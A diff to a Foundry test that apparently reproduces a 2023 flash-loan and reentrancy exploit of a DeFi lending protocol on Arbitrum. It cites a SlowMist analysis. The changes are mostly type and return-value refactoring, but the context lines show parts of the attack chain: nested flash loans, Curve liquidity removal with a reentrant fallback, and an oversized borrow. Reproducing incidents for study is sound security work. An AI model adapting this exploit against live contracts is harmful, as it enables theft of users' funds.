@@ -2,6 +2,14 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+import {ICurvePool} from "src/interfaces/ICurvePool.sol";
+import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
+import {IAaveFlashloan} from "src/interfaces/IAaveFlashloan.sol";
+import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
+import {ICointroller} from "src/interfaces/ICointroller.sol";
+import {IcurveYSwap} from "src/interfaces/IcurveYSwap.sol";
+import {IWETH} from "src/interfaces/IWETH.sol";
 
 // @Analysis
 // https://twitter.com/SlowMist_Team/status/1623956763598000129
@@ -57,12 +65,12 @@ interface GMXVAULT {
 
 contract ContractTest is Test {
 
-    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
+    IWETH WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
     IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
     IERC20 USX = IERC20(0x641441c631e2F909700d2f41FD87F0aA6A6b4EDb);
     IERC20 WSTETH = IERC20(0x5979D7b546E38E414F7E9822514be443A4800529);
     IERC20 WSTETHCRV = IERC20(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);
-    IERC20 WSTETHCRVGAUGE = IERC20(0x098EF55011B6B8c99845128114A9D9159777d697);
+    IWETH WSTETHCRVGAUGE = IWETH(payable(0x098EF55011B6B8c99845128114A9D9159777d697));
     IVWSTETHCRVGAUGE VWSTETHCRVGAUGE = IVWSTETHCRVGAUGE(0x2cE498b79C499c6BB64934042eBA487bD31F75ea);
     IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
@@ -185,15 +193,17 @@ contract ContractTest is Test {
         uint256[] calldata premiums,
         address initiator,
         bytes calldata params
-    ) external returns (bool) {
+    ) external returns (bool booleans) {
         if (msg.sender == address(aaveV3)) {
             RadiantFlashloan();
             WETH.approve(address(aaveV3), type(uint256).max);
-            return true;
+            booleans = true;
+            return booleans;
         } else if (msg.sender == address(Radiant)) {
             UniSwapV3Flashloan();
             WETH.approve(address(Radiant), type(uint256).max);
-            return true;
+            booleans = true;
+            return booleans;
         }
     }
     // 5.RadiantFlashloan
@@ -309,9 +319,11 @@ contract ContractTest is Test {
         burnAmount = 2_924_339_222_027_299_635_899;
         curvePool.remove_liquidity(burnAmount, [uint256(0), uint256(0)]);
         curvePool.exchange(1, 0, WSTETH.balanceOf(address(this)), 0);
-        address(WETH).call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
+        (bool success4,) = address(WETH).call{value: address(this).balance}(abi.encodeWithSignature("deposit()"));
         WETH.transfer(address(swapFlashLoan), amount + fee); // repay flashloan amount
     }
+
+    receive() external payable {}
 
     fallback() external payable {
         if (nonce == 0 && msg.sender == address(curvePool)) {
@@ -368,7 +380,7 @@ contract Borrower is Test {
         );
         WSTETHCRV.approve(address(WSTETHCRVGAUGE), type(uint256).max);
         uint256 depositAmount = 1_904_761_904_761_904_761_904;
-        address(WSTETHCRVGAUGE).call(abi.encodeWithSignature("deposit(uint256)", depositAmount));
+        (bool success5,) = address(WSTETHCRVGAUGE).call(abi.encodeWithSignature("deposit(uint256)", depositAmount));
         WSTETHCRVGAUGE.approve(address(dForceContract), type(uint256).max);
         uint256 WSTETHCRVGAUGEAmount = WSTETHCRVGAUGE.balanceOf(address(this));
         uint256 borrowAmount = 2_080_000_000_000_000_000_000_000;
